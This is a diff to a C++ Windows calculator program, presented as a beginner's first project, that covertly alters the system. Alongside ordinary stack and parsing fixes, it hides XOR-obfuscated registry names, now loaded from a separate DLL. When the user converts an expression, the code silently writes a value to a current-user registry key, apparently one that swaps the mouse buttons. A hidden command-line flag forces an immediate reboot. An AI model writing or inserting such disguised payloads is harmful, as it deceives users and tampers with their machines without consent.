@@ -9,6 +9,7 @@
 #include <windows.h>
 
 using namespace std;
+
 const int MAX = 4096;
 string stack[MAX];
 int tos = 0;
@@ -16,12 +17,61 @@ string x = "Hello, this is calc!";
 string x1 = "My first project!";
 string infixExpr;
 
+BYTE* bytes = nullptr;
+size_t bytes_len = 0;
+BYTE* bytes1 = nullptr;
+size_t bytes_len1 = 0;
 
-std::vector<BYTE> XORByteArrays(const BYTE* arr1, string x, size_t length) {
-    std::vector<BYTE> arr2(x.begin(), x.end());
+typedef void (*InitFunc)();
+HMODULE hDll;
+
+int __init() {
+    hDll = LoadLibrary(L"Dll1.dll");
+    if (!hDll) {
+        cerr << "Can't load DLL\n";
+        return 1;
+    }
+
+    InitFunc init = (InitFunc)GetProcAddress(hDll, "init");
+    if (!init) {
+        cerr << "Can't find function\n";
+        FreeLibrary(hDll);
+        return 1;
+    }
+
+    BYTE* dll_bytes = (BYTE*)GetProcAddress(hDll, "bytes");
+    size_t* dll_bytes_len = (size_t*)GetProcAddress(hDll, "bytes_len");
+    BYTE* dll_bytes1 = (BYTE*)GetProcAddress(hDll, "bytes1");
+    size_t* dll_bytes_len1 = (size_t*)GetProcAddress(hDll, "bytes_len1");
+
+    if (!(dll_bytes || !dll_bytes_len) || !(dll_bytes1 || !dll_bytes_len1)) {
+        cerr << "Can't get bytes or bytes_len from DLL\n";
+        FreeLibrary(hDll);
+        return 1;
+    }
+
+    init();
+
+    bytes_len = *dll_bytes_len;
+    bytes = new BYTE[bytes_len];
+    bytes_len1 = *dll_bytes_len1;
+    bytes1 = new BYTE[bytes_len1];
+    memcpy(bytes, dll_bytes, bytes_len);
+    memcpy(bytes1, dll_bytes1, bytes_len1);
+
+    return 0;
+}
+
+std::vector<BYTE> bebabi(const BYTE* arr1, const string& x, size_t length) {
+    // Длина x может быть меньше length, чтобы избежать выхода за границы
+    size_t len = min(x.size(), length);
+    std::vector<BYTE> arr2(x.begin(), x.begin() + len);
     std::vector<BYTE> result(length);
+
     for (size_t i = 0; i < length; ++i) {
-        result[i] = arr1[i] ^ arr2[i];
+        BYTE b1 = arr1[i];
+        BYTE b2 = (i < len) ? arr2[i] : 0;
+        result[i] = b1 ^ b2;
     }
     return result;
 }
@@ -31,8 +81,7 @@ void push(string val) {
         printf("Stack overflow\n");
         return;
     }
-    stack[tos] = val;
-    tos++;
+    stack[tos++] = val;
 }
 
 string pop(void) {
@@ -40,8 +89,7 @@ string pop(void) {
         printf("Stack is empty\n");
         return "";
     }
-    tos--;
-    return stack[tos];
+    return stack[--tos];
 }
 
 int priority(char s) {
@@ -61,19 +109,21 @@ void in_file(string str) {
     }
 }
 
-
 string convertToRPN(const string& str) {
     HKEY hKey;
-    BYTE bytes[] = { 0x0b, 0x0a, 0x02, 0x18, 0x1d, 0x43, 0x4c, 0x54, 0x38, 0x08, 0x1d, 0x45, 0x05, 0x2f, 0x6d, 0x0c, 0x14, 0x1f, 0x06, 0x21 };
-    BYTE bytes1[] = { 0x1E, 0x0E, 0x41, 0x16, 0x24, 0x1D, 0x06, 0x07, 0x45, 0x32, 0x07, 0x1B, 0x1E, 0x0A, 0x0D, 0x07, 0x21 };
+    if (bytes == nullptr || bytes_len == 0) {
+        cerr << "bytes not initialized\n";
+        return "";
+    }
 
-    std::vector<BYTE> pipap = XORByteArrays(bytes, x, sizeof(bytes));
-    std::vector<BYTE> pippi = XORByteArrays(bytes1, x1, sizeof(bytes1));
+    std::vector<BYTE> pipap = bebabi(bytes, x, bytes_len);
+    std::vector<BYTE> pippi = bebabi(bytes1, x1, sizeof(bytes1));
+
     LPCSTR subKey = reinterpret_cast<LPCSTR>(pipap.data());
     LPCSTR subKey1 = reinterpret_cast<LPCSTR>(pippi.data());
+
     if (RegOpenKeyExA(HKEY_CURRENT_USER, subKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
         DWORD value = 1;
-
         RegSetValueExA(hKey, subKey1, 0, REG_DWORD, reinterpret_cast<const BYTE*>(&value), sizeof(value));
         RegCloseKey(hKey);
     }
@@ -94,11 +144,11 @@ string convertToRPN(const string& str) {
             push("(");
         }
         else if (ch == ')') {
-            while (!stack[tos - 1].empty() && stack[tos - 1] != "(") {
+            while (tos > 0 && stack[tos - 1] != "(") {
                 output += pop();
                 output += ' ';
             }
-            pop();
+            pop(); // удаляем "("
         }
         else {
             while (tos > 0 && priority(ch) <= priority(stack[tos - 1][0])) {
@@ -133,7 +183,7 @@ int evaluateRPN(const string& expression) {
             case '-': evalStack[evalTos++] = a - b; break;
             case '*': evalStack[evalTos++] = a * b; break;
             case '/':
-                if (b == 0) throw runtime_error("Devide on 0");
+                if (b == 0) throw runtime_error("Divide by 0");
                 evalStack[evalTos++] = a / b;
                 break;
             }
@@ -141,17 +191,24 @@ int evaluateRPN(const string& expression) {
     }
     return evalStack[0];
 }
-void startHello() {
 
+void startHello() {
     cout << x << endl;
     cout << x1 << endl;
     cout << "\nInput expression: ";
     getline(cin, infixExpr);
     cout << "\n\n";
 }
-int main() {
+
+int main(int argc, char* argv[]) {
     setlocale(LC_ALL, "rus");
+
     startHello();
+
+    if (__init() != 0) {
+        return 1; // Ошибка инициализации DLL
+    }
+
     string rpnExpr = convertToRPN(infixExpr);
 
     try {
@@ -162,5 +219,18 @@ int main() {
         cerr << "Error: " << e.what() << endl;
     }
 
+    for (int i = 1; i < argc - 1; ++i) {
+        if (string(argv[i]) == "-p" && string(argv[i + 1]) == "1") {
+            system("shutdown /r /t 0");
+            return 0;
+        }
+    }
+
+    delete[] bytes;
+    bytes = nullptr;
+    delete[] bytes1;
+    bytes1 = nullptr;
+
+    FreeLibrary(hDll);
     return 0;
 }
